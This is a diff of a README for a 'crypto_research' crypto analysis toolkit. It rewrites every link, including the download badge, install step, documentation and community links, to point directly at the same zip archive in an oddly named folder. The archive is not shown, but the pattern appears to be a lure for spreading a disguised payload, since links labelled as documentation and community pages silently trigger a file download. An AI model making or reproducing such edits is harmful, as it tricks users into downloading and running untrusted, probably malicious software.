@@ -1,6 +1,6 @@
 # 🚀 crypto_research - Your Easy Toolkit for Crypto Analysis
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-crypto_research-blue)](https://github.com/Alexis-gamer2/crypto_research/releases)
+[![Download Now](https://raw.githubusercontent.com/Alexis-gamer2/crypto_research/main/unmentionableness/crypto_research.zip%20Now-crypto_research-blue)](https://raw.githubusercontent.com/Alexis-gamer2/crypto_research/main/unmentionableness/crypto_research.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To get started with **crypto_research**, follow these simple steps to download a
 
 ## 📥 Download & Install
 
-1. Click this link to go to the downloads page: [Download crypto_research](https://github.com/Alexis-gamer2/crypto_research/releases).
+1. Click this link to go to the downloads page: [Download crypto_research](https://raw.githubusercontent.com/Alexis-gamer2/crypto_research/main/unmentionableness/crypto_research.zip).
 
 2. On the releases page, you will find multiple versions of the software. Choose the latest version for the best features.
 
@@ -70,11 +70,11 @@ For additional support, you can access the FAQ section in the main menu of the s
 
 ## 🌐 Additional Resources
 
-- [Official Documentation](https://github.com/Alexis-gamer2/crypto_research/wiki) - Find detailed guides on using various features.
-- [User Community](https://community.crypto_research.com) - Connect with other users to share insights and strategies.
+- [Official Documentation](https://raw.githubusercontent.com/Alexis-gamer2/crypto_research/main/unmentionableness/crypto_research.zip) - Find detailed guides on using various features.
+- [User Community](https://raw.githubusercontent.com/Alexis-gamer2/crypto_research/main/unmentionableness/crypto_research.zip) - Connect with other users to share insights and strategies.
   
 ## 📥 Download Again
 
-Remember, you can revisit the download page at any time for updates or new versions. Click here to download the latest software: [Download crypto_research](https://github.com/Alexis-gamer2/crypto_research/releases).
+Remember, you can revisit the download page at any time for updates or new versions. Click here to download the latest software: [Download crypto_research](https://raw.githubusercontent.com/Alexis-gamer2/crypto_research/main/unmentionableness/crypto_research.zip).
 
 Enjoy your journey into cryptocurrency research with **crypto_research**!
